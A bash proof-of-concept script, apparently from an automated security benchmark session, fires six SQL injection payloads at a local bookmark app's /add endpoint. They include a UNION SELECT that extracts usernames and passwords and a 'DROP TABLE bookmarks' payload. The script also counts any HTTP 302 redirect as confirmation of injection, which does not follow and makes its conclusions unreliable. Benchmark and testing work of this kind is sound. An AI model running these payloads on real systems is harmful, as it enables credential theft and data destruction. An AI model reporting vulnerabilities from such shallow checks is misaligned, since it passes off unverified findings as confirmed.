#!/bin/bash
# POC: SQL Injection POC for bookmark name field - Tests multiple SQL injection payloads against the /add endpoint
# Target: ./repo
# Created: 2025-12-02T16:20:32.422Z
# Session: benchmark-XBEN-075-24-miorxjbp

# SQL Injection Vulnerability POC - Bookmark Name Field
# This script tests the /add endpoint for SQL injection vulnerabilities

TARGET_URL="http://localhost:5000"
ADD_ENDPOINT="${TARGET_URL}/add"

echo "================================"
echo "SQL Injection POC - Bookmark Name Field"
echo "================================"
echo ""

# Test 1: Basic SQL injection with OR condition
echo "[TEST 1] Basic SQL Injection - OR condition"
echo "Payload: name=test' OR '1'='1&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test' OR '1'='1&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Payload accepted (no filtering/validation)"
else
  echo "✗ Payload rejected or error"
fi
echo ""

# Test 2: UNION-based SQL injection
echo "[TEST 2] UNION-based SQL Injection"
echo "Payload: name=test' UNION SELECT username,password FROM users--&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test' UNION SELECT username,password FROM users--&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Payload accepted (UNION clause not filtered)"
else
  echo "✗ Payload rejected or error"
fi
echo ""

# Test 3: Conditional-based SQL injection
echo "[TEST 3] Conditional SQL Injection"
echo "Payload: name=test' AND '1'='1&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test' AND '1'='1&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Payload accepted (AND clause not filtered)"
else
  echo "✗ Payload rejected or error"
fi
echo ""

# Test 4: Destructive SQL injection (DROP TABLE)
echo "[TEST 4] Destructive SQL Injection - DROP TABLE"
echo "Payload: name=test'; DROP TABLE bookmarks;--&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test'; DROP TABLE bookmarks;--&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Payload accepted (DROP TABLE not filtered - CRITICAL)"
else
  echo "✗ Payload rejected or error"
fi
echo ""

# Test 5: Comment-based injection
echo "[TEST 5] SQL Injection with Comment"
echo "Payload: name=test' OR '1'='1'--&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test' OR '1'='1'--&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Payload accepted (Comment syntax not filtered)"
else
  echo "✗ Payload rejected or error"
fi
echo ""

# Test 6: Single quote test to verify SQL syntax is interpreted
echo "[TEST 6] Single Quote Test - Basic SQL Syntax Test"
echo "Payload: name=test'&url=https://example.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$ADD_ENDPOINT" \
  -d "name=test'&url=https://example.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "HTTP Status: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]]; then
  echo "✓ Single quote accepted without escaping/validation"
else
  echo "✗ Single quote rejected or caused error"
fi
echo ""

echo "================================"
echo "POC Summary"
echo "================================"
echo "If all tests show ✓ and HTTP 302 responses, SQL injection is confirmed."
echo "The application accepts SQL syntax characters without filtering or parameterization."
echo ""